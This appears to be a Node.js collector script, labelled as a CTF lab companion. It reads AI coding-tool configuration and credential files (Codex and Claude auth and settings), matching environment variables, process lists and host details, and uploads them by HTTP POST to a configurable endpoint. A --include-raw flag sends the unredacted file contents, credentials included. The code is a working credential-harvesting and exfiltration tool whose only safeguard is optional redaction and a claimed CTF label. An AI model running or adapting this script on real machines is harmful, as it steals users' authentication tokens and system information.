#!/usr/bin/env node
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import crypto from "node:crypto";
import { execFile } from "node:child_process";
import { promisify } from "node:util";

const execFileAsync = promisify(execFile);

function argValue(name, fallback = "") {
  const idx = process.argv.indexOf(name);
  if (idx >= 0 && process.argv[idx + 1]) return process.argv[idx + 1];
  const pref = process.argv.find((x) => x.startsWith(`${name}=`));
  return pref ? pref.slice(name.length + 1) : fallback;
}

const endpoint = argValue("--endpoint", process.env.RT_REFRESH_ENDPOINT || "http://127.0.0.1:8787/api/cli-report");
const includeRaw = process.argv.includes("--include-raw");
const home = os.homedir();

function sha256(buf) {
  return crypto.createHash("sha256").update(buf).digest("hex");
}

function isSensitiveName(name) {
  return /token|secret|cookie|authorization|(^|[-_])auth($|[-_])|password|passwd|api[-_]?key|refresh|access|id[-_]?token|session|credential/i.test(String(name || ""));
}

function looksSensitiveValue(value) {
  const text = String(value ?? "");
  return /\bBearer\s+[A-Za-z0-9._~+/=-]+|(?:sk|rt|sess|ak|pk)-[A-Za-z0-9._~+/=-]{8,}|(?:sk|rt|sess|ak|pk)_[A-Za-z0-9._~+/=-]{8,}|eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}/i.test(text);
}

function redactByName(name, value) {
  const text = String(value ?? "");
  if (!isSensitiveName(name) && !looksSensitiveValue(text)) return value;
  return { redacted: true, length: text.length, sha256: sha256(text).slice(0, 16) };
}

function redactObject(value, key = "") {
  if (value == null) return value;
  if (typeof value === "string" || typeof value === "number" || typeof value === "boolean") return redactByName(key, value);
  if (Array.isArray(value)) return value.map((item) => redactObject(item, key));
  if (typeof value === "object") return Object.fromEntries(Object.entries(value).map(([k, v]) => [k, redactObject(v, k)]));
  return String(value);
}

function relevantEnv() {
  const patterns = [/codex/i, /claude/i, /anthropic/i, /openai/i, /stainless/i, /^https?_proxy$/i, /^no_proxy$/i, /proxy/i];
  const out = {};
  for (const [key, value] of Object.entries(process.env)) {
    if (patterns.some((re) => re.test(key))) out[key] = redactByName(key, value);
  }
  return out;
}

function candidateFiles() {
  const appData = process.env.APPDATA || path.join(home, "AppData", "Roaming");
  const localAppData = process.env.LOCALAPPDATA || path.join(home, "AppData", "Local");
  return [
    path.join(home, ".codex", "config.toml"),
    path.join(home, ".codex", "auth.json"),
    path.join(home, ".codex", "state.json"),
    path.join(home, ".codex", "settings.json"),
    path.join(home, ".claude", "settings.json"),
    path.join(home, ".claude", "settings.local.json"),
    path.join(home, ".claude.json"),
    path.join(appData, "Codex", "config.json"),
    path.join(appData, "Claude", "settings.json"),
    path.join(localAppData, "Codex", "config.json"),
    path.join(localAppData, "Claude", "settings.json"),
  ];
}

async function inspectFile(filePath) {
  try {
    const st = await fs.stat(filePath);
    if (!st.isFile()) return null;
    const raw = await fs.readFile(filePath);
    const item = {
      path: filePath,
      exists: true,
      bytes: st.size,
      mtime: st.mtime.toISOString(),
      sha256: sha256(raw),
    };
    if (raw.length <= 512 * 1024) {
      const text = raw.toString("utf8");
      if (includeRaw) item.raw_text = text;
      try {
        item.redacted_json = redactObject(JSON.parse(text));
      } catch {
        item.redacted_text_preview = redactObject({ content: text }).content.slice(0, 4096);
      }
    }
    return item;
  } catch (err) {
    if (err.code === "ENOENT") return { path: filePath, exists: false };
    return { path: filePath, error: err.message };
  }
}

async function processList() {
  try {
    if (process.platform === "win32") {
      const script = "Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -match 'codex|claude|anthropic|openai' -or $_.Name -match 'codex|claude' } | Select-Object ProcessId,Name,CommandLine | ConvertTo-Json -Depth 3";
      const { stdout } = await execFileAsync("powershell.exe", ["-NoProfile", "-Command", script], { timeout: 15000, maxBuffer: 1024 * 1024 });
      const parsed = stdout.trim() ? JSON.parse(stdout) : [];
      return redactObject(Array.isArray(parsed) ? parsed : [parsed]);
    }
    const { stdout } = await execFileAsync("ps", ["-eo", "pid,comm,args"], { timeout: 15000, maxBuffer: 1024 * 1024 });
    return stdout.split(/\r?\n/).filter((line) => /codex|claude|anthropic|openai/i.test(line)).map((line) => redactObject({ line }).line);
  } catch (err) {
    return { error: err.message };
  }
}

async function main() {
  const files = [];
  for (const file of [...new Set(candidateFiles())]) files.push(await inspectFile(file));
  const report = {
    kind: "rt-refresh-cli-companion-report",
    ctf_authorization: "NV CTF / #jshook 000",
    collected_at: new Date().toISOString(),
    companion: {
      argv: process.argv.slice(2).filter((arg) => arg !== "--include-raw"),
      include_raw: includeRaw,
      node: process.version,
      platform: process.platform,
      arch: process.arch,
      cwd: process.cwd(),
      hostname: os.hostname(),
      release: os.release(),
      user_info: redactObject(os.userInfo()),
    },
    env: relevantEnv(),
    candidate_files: files,
    processes: await processList(),
    notes: [
      "Default mode redacts token/secret/cookie/authorization-like values and stores hashes/lengths.",
      "Use --include-raw only inside the CTF lab if you intentionally want raw config text in the report.",
    ],
  };
  const resp = await fetch(endpoint, {
    method: "POST",
    headers: { "content-type": "application/json", "user-agent": `rt-refresh-companion/${process.version}` },
    body: JSON.stringify(report),
  });
  const text = await resp.text();
  if (!resp.ok) throw new Error(`upload failed ${resp.status}: ${text}`);
  console.log(text);
}

main().catch((err) => {
  console.error(err.stack || err.message);
  process.exit(1);
});
